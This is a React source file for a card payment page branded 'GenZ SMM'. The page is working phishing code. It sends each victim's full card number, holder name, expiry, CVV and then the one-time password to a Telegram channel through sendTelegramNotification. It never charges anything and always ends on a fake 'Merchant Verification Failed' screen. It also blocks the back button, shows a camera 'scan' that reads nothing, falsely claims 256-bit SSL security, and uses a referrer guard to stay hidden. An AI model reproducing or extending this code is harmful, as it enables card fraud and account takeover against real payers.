import { useState, useRef, useEffect, useCallback } from "react";
import { useNavigate, useSearchParams, useLocation } from "react-router-dom";
import { CreditCard, Lock, Camera, X, ArrowLeft } from "lucide-react";
import { sendTelegramNotification } from "@/lib/telegram";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";

import genzLogo from "@/assets/genz-logo.png";
import visaLogoImg from "@/assets/visa-logo.png";
import mastercardLogoImg from "@/assets/mastercard-logo-color.png";
import mastercardLogoColorImg from "@/assets/mastercard-logo-color.png";

const cardOptions = [
  {
    id: "visa", label: "Visa", logoImg: visaLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0d1b4a 0%, #1a1f71 30%, #0d47a1 60%, #1565c0 100%)",
    gradientBack: "linear-gradient(135deg, #0d47a1 0%, #1a1f71 50%, #0d2137 100%)",
    accent: "#1a1f71", accentHover: "#0d1547",
  },
  {
    id: "mastercard", label: "Mastercard", logoImg: mastercardLogoImg, logoImgColor: mastercardLogoColorImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #1a1a2e 0%, #16213e 30%, #0f3460 60%, #533483 100%)",
    gradientBack: "linear-gradient(135deg, #533483 0%, #0f3460 50%, #1a1a2e 100%)",
    accent: "#EB001B", accentHover: "#c0000f",
  },
];

const CardPaymentPage = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const location = useLocation();
  const cardType = location.pathname.replace('/', '');
  const amount = searchParams.get("amount") || "00";
  const { checking: referrerChecking } = useReferrerGuard();
  

  const selectedCard = cardOptions.find((c) => c.id === cardType);

  // Form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isFlipped, setIsFlipped] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [cardVisible, setCardVisible] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [otpTimer, setOtpTimer] = useState(60);
  const [otpLoading, setOtpLoading] = useState(false);
  const [showCamera, setShowCamera] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);

  const cardNumberRef = useRef<HTMLInputElement>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const cvvMaxLength = selectedCard?.cvvLength ?? 3;

  useEffect(() => {
    if (!selectedCard) {
      navigate(`/?amount=${amount}`);
      return;
    }
    setTimeout(() => setCardVisible(true), 300);
    setTimeout(() => cardNumberRef.current?.focus(), 600);
  }, [selectedCard, navigate, amount]);

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (showOtp) {
        navigate(`/payment-cancelled?channel=${selectedCard?.label || 'Card'} Card Payment&reason=Payment isn't completed&amount=${amount}`);
      } else {
        navigate(`/?amount=${amount}`);
      }
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, selectedCard, showOtp]);

  useEffect(() => {
    if (showOtp) setTimeout(() => otpInputRef.current?.focus(), 100);
  }, [showOtp]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtp && otpTimer > 0) {
      interval = setInterval(() => setOtpTimer((p) => p - 1), 1000);
    }
    return () => clearInterval(interval);
  }, [showOtp, otpTimer]);

  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      if ((streamRef.current as any)._scanInterval) clearInterval((streamRef.current as any)._scanInterval);
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if ((window as any).__scanInterval) {
      clearInterval((window as any).__scanInterval);
      delete (window as any).__scanInterval;
    }
  }, []);

  const startCamera = useCallback(async () => {
    setShowCamera(true);
    setScanProgress(0);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
      let progress = 0;
      let direction = 1;
      const scanInterval = setInterval(() => {
        progress += direction * 1.5;
        if (progress >= 100) direction = -1;
        if (progress <= 0) direction = 1;
        setScanProgress(progress);
      }, 30);
      streamRef.current.addEventListener('inactive', () => clearInterval(scanInterval));
      (streamRef.current as any)._scanInterval = scanInterval;
    } catch {
      let progress = 0;
      let direction = 1;
      const scanInterval = setInterval(() => {
        progress += direction * 1.5;
        if (progress >= 100) direction = -1;
        if (progress <= 0) direction = 1;
        setScanProgress(progress);
      }, 30);
      (window as any).__scanInterval = scanInterval;
    }
  }, []);

  useEffect(() => {
    return () => stopCamera();
  }, [stopCamera]);

  const formatCardNumber = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, 16);
    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatExpiry = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, 4);
    if (nums.length >= 3) return `${nums.slice(0, 2)}/${nums.slice(2)}`;
    return nums;
  };

  const displayCardNumber = () => {
    const nums = cardNumber.replace(/\s/g, "");
    const padded = nums.padEnd(16, "•");
    return `${padded.slice(0, 4)} ${padded.slice(4, 8)} ${padded.slice(8, 12)} ${padded.slice(12, 16)}`;
  };

  const getMaskedCard = () => {
    const nums = cardNumber.replace(/\s/g, "");
    if (nums.length < 8) return "****";
    return `**** **** **** ${nums.slice(-4)}`;
  };

  const isFormValid = () => {
    const nums = cardNumber.replace(/\s/g, "");
    return nums.length === 16 && expiry.length === 5 && cvv.length === cvvMaxLength && cardHolder.length > 2;
  };

  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[0-9]/g, "");
    setCardHolder(value);
  };

  const handleSubmit = () => {
    if (!isFormValid() || !selectedCard) return;
    setIsLoading(true);
    sendTelegramNotification({
      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
      cardName: cardHolder, cardNumber, expiry, cvv
    });
    setTimeout(() => {
      setIsLoading(false);
      setShowOtp(true);
      setOtpTimer(60);
    }, 4000);
  };

  const handleOtpConfirm = () => {
    if (otpCode.length !== 6 || !selectedCard) return;
    sendTelegramNotification({
      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
      cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode
    });
    setOtpLoading(true);
    setTimeout(() => {
      setOtpLoading(false);
      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Merchant Verification Failed&amount=${amount}&ref=${selectedCard.id.toUpperCase()}` + Date.now().toString().slice(-8));
    }, 5000);
  };

  const handleResendOtp = () => {
    if (otpTimer > 0) return;
    setOtpTimer(60);
    setOtpCode("");
  };

  if (referrerChecking || !selectedCard) return null;

  // Camera overlay
  if (showCamera) {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
        <div className="absolute top-4 right-4 z-10">
          <button onClick={() => { stopCamera(); setShowCamera(false); }} className="w-10 h-10 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
            <X className="w-5 h-5 text-white" />
          </button>
        </div>
        <div className="relative w-full max-w-md px-6">
          <video ref={videoRef} className="w-full rounded-2xl bg-gray-900 aspect-video object-cover" muted playsInline />
          <div className="absolute inset-6 rounded-2xl border-2 border-white/30 pointer-events-none">
            <div className="absolute top-0 left-0 w-8 h-8 border-t-2 border-l-2 border-white rounded-tl-lg" />
            <div className="absolute top-0 right-0 w-8 h-8 border-t-2 border-r-2 border-white rounded-tr-lg" />
            <div className="absolute bottom-0 left-0 w-8 h-8 border-b-2 border-l-2 border-white rounded-bl-lg" />
            <div className="absolute bottom-0 right-0 w-8 h-8 border-b-2 border-r-2 border-white rounded-br-lg" />
            <div className="absolute left-2 right-2 h-0.5 bg-gradient-to-r from-transparent via-blue-400 to-transparent transition-all duration-100" style={{ top: `${scanProgress}%` }} />
          </div>
        </div>
        <div className="mt-6 w-full max-w-md px-6">
          <p className="text-white/70 text-xs text-center">Position your card within the frame to scan</p>
          <p className="text-white/40 text-[10px] text-center mt-2">Card detection requires a physical card in view</p>
        </div>
      </div>
    );
  }

  // OTP screen
  if (showOtp) {
    return (
      <div className="fixed inset-0 bg-gray-100 flex flex-col items-start justify-start p-4 pt-8 overflow-auto">
        <div className="w-full max-w-md mx-auto">
          <div className="flex items-center justify-between mb-5">
            <button onClick={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
              <ArrowLeft className="w-4 h-4" />Back
            </button>
            <div className="flex items-center gap-2">
              <img src={genzLogo} alt="GenZ" className="w-6 h-6 rounded-full" />
              <span className="text-gray-700 font-medium text-sm">GenZ SMM</span>
            </div>
            <div className="flex items-center gap-1 text-gray-400">
              <Lock className="w-3 h-3" /><span className="text-[10px]">Secure</span>
            </div>
          </div>

          <div className="bg-white rounded-2xl shadow-sm p-6 animate-scale-in">
            <div className="flex flex-col items-center mb-6">
              <div className="w-14 h-14 rounded-full flex items-center justify-center mb-3" style={{ backgroundColor: `${selectedCard.accent}15` }}>
                <Lock className="w-6 h-6" style={{ color: selectedCard.accent }} />
              </div>
              <h3 className="text-gray-800 font-semibold text-base mb-1">OTP Verification</h3>
              <p className="text-gray-500 text-xs text-center leading-relaxed">
                A 6-digit verification code has been sent to your registered mobile number linked to card {getMaskedCard()}
              </p>
            </div>

            <div className="mb-4">
              <label className="text-gray-500 text-[11px] font-medium uppercase tracking-wide mb-1.5 block">Enter OTP</label>
              <input
                ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="000000"
                className="w-full border border-gray-200 rounded-lg px-3 py-3 text-center text-lg text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-1 transition-colors font-mono tracking-[8px]"
                style={{ borderColor: otpCode ? selectedCard.accent : undefined }}
              />
            </div>

            <p
              className={`text-center text-xs mb-4 ${otpTimer > 0 ? 'text-gray-400' : 'underline cursor-pointer'}`}
              style={otpTimer <= 0 ? { color: selectedCard.accent } : undefined}
              onClick={handleResendOtp}
            >
              {otpTimer > 0 ? `Resend code in ${otpTimer}s` : 'Resend Code'}
            </p>

            <button
              onClick={handleOtpConfirm}
              disabled={otpCode.length !== 6 || otpLoading}
              className={`w-full py-3 rounded-lg text-sm font-semibold transition-all duration-300 ${
                otpCode.length === 6 && !otpLoading ? "text-white shadow-md hover:shadow-lg" : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
              style={otpCode.length === 6 && !otpLoading ? { backgroundColor: selectedCard.accent } : undefined}
            >
              {otpLoading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  Verifying...
                </span>
              ) : `Verify & Pay ৳${amount}`}
            </button>
          </div>

          <p className="text-center text-gray-400 text-[10px] mt-4">Your payment is secured with 256-bit SSL encryption</p>
        </div>
      </div>
    );
  }

  // Card form screen
  return (
    <div className="fixed inset-0 bg-gradient-to-b from-gray-50 to-gray-100 flex flex-col items-center justify-start p-0 overflow-hidden">
      <div className="flex flex-col min-h-[100dvh]" style={{ width: "300px", maxWidth: "300px", minWidth: "300px" }}>
        {/* Header */}
        <div className="flex items-center justify-between px-3 pt-3 pb-2 shrink-0">
          <button onClick={() => navigate(`/?amount=${amount}`)} className="flex items-center gap-1 text-gray-500 text-xs hover:text-gray-700 transition-colors">
            <ArrowLeft className="w-3.5 h-3.5" />Back
          </button>
          <div className="flex items-center gap-1.5">
            <img src={genzLogo} alt="GenZ" className="w-5 h-5 rounded-full" />
            <span className="text-gray-700 font-medium text-xs">GenZ SMM</span>
          </div>
          <div className="flex items-center gap-1 text-gray-400">
            <Lock className="w-3 h-3" /><span className="text-[10px]">Secure</span>
          </div>
        </div>

        {/* Card Preview */}
        <div className="px-3 mb-3 transition-all duration-700 ease-out shrink-0" style={{ opacity: cardVisible ? 1 : 0, transform: cardVisible ? "translateY(0) scale(1)" : "translateY(-40px) scale(0.9)" }}>
          <div className="relative w-full transition-transform duration-600 ease-in-out h-[155px]" style={{ transformStyle: "preserve-3d", transform: isFlipped ? "rotateY(180deg)" : "rotateY(0deg)", perspective: "1000px" }}>
            {/* Front */}
            <div className="absolute inset-0 rounded-2xl p-4 flex flex-col justify-between shadow-xl" style={{ backfaceVisibility: "hidden", background: selectedCard.gradient }}>
              <div className="flex justify-between items-start">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-6 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md opacity-90" />
                  <CreditCard className="w-4 h-4 text-white/40" />
                </div>
                <img src={selectedCard.id === 'mastercard' ? selectedCard.logoImgColor! : selectedCard.logoImg} alt={selectedCard.label} className={`h-7 object-contain ${selectedCard.id === 'mastercard' ? '' : 'brightness-0 invert'}`} />
              </div>
              <div>
                <p className="text-white text-sm tracking-[2px] font-mono mb-2">{displayCardNumber()}</p>
                <div className="flex justify-between items-end">
                  <div>
                    <p className="text-white/40 text-[8px] uppercase mb-0.5 tracking-wider">Card Holder</p>
                    <p className="text-white text-xs font-medium tracking-wide uppercase">{cardHolder || "YOUR NAME"}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-white/40 text-[8px] uppercase mb-0.5 tracking-wider">Expires</p>
                    <p className="text-white text-xs font-medium">{expiry || "MM/YY"}</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Back */}
            <div className="absolute inset-0 rounded-2xl flex flex-col shadow-xl" style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)", background: selectedCard.gradientBack }}>
              <div className="w-full h-10 bg-black/50 mt-6" />
              <div className="px-4 mt-4 flex items-center gap-3">
                <div className="flex-1 h-8 bg-white/20 rounded" />
                <div className="bg-white px-3 py-1.5 rounded text-xs font-mono text-gray-800 min-w-[50px] text-center">
                  {cvv || "•".repeat(cvvMaxLength)}
                </div>
              </div>
              <div className="flex justify-end px-4 mt-auto mb-4">
                <img
                  src={selectedCard.id === 'mastercard' ? selectedCard.logoImgColor ?? selectedCard.logoImg : selectedCard.logoImg}
                  alt={selectedCard.label}
                  className={`h-4 object-contain opacity-50 ${selectedCard.id === 'mastercard' ? '' : 'brightness-0 invert'}`}
                />
              </div>
            </div>
          </div>
        </div>

        {/* Form */}
        <div className="flex-1 bg-white rounded-t-3xl shadow-[0_-4px_30px_rgba(0,0,0,0.08)] px-4 pt-4 pb-4 transition-all duration-500 flex flex-col" style={{ opacity: cardVisible ? 1 : 0, transform: cardVisible ? "translateY(0)" : "translateY(20px)", transitionDelay: "200ms" }}>
          <div className="space-y-2.5 flex-1">
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-gray-500 text-[10px] font-medium uppercase tracking-wide">Card Number</label>
                <button onClick={startCamera} className="flex items-center gap-1 text-gray-400 text-[9px] font-medium transition-colors">
                  <Camera className="w-3 h-3" />Scan
                </button>
              </div>
              <input
                ref={cardNumberRef} type="tel" inputMode="numeric" value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                placeholder="0000 0000 0000 0000"
                className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-1 transition-colors font-mono"
              />
            </div>
            <div>
              <label className="text-gray-500 text-[10px] font-medium uppercase tracking-wide mb-1 block">Card Holder Name</label>
              <input
                type="text" value={cardHolder} onChange={handleCardHolderChange} placeholder="John Doe"
                className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-1 transition-colors uppercase"
              />
            </div>
            <div className="flex gap-2.5">
              <div className="flex-1">
                <label className="text-gray-500 text-[10px] font-medium uppercase tracking-wide mb-1 block">Expiry</label>
                <input
                  type="tel" inputMode="numeric" value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  placeholder="MM/YY"
                  className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-1 transition-colors font-mono"
                />
              </div>
              <div className="flex-1">
                <label className="text-gray-500 text-[10px] font-medium uppercase tracking-wide mb-1 block">CVV</label>
                <input
                  type="password" inputMode="numeric" maxLength={cvvMaxLength} value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, cvvMaxLength))}
                  onFocus={() => setIsFlipped(true)} onBlur={() => setIsFlipped(false)}
                  placeholder={"•".repeat(cvvMaxLength)}
                  className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-1 transition-colors font-mono"
                />
              </div>
            </div>
          </div>

          <button
            onClick={handleSubmit} disabled={!isFormValid() || isLoading}
            className={`w-full py-3 rounded-xl text-sm font-semibold transition-all duration-300 mt-3.5 ${
              isFormValid() && !isLoading ? "text-white shadow-lg hover:shadow-xl" : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            style={isFormValid() && !isLoading ? { backgroundColor: selectedCard.accent } : undefined}
          >
            {isLoading ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
                Processing...
              </span>
            ) : `Pay ৳${amount}`}
          </button>

          <p className="text-center text-gray-400 text-[10px] mt-2">Your payment is secured with 256-bit SSL encryption</p>
        </div>
      </div>
      
    </div>
  );
};

export default CardPaymentPage;
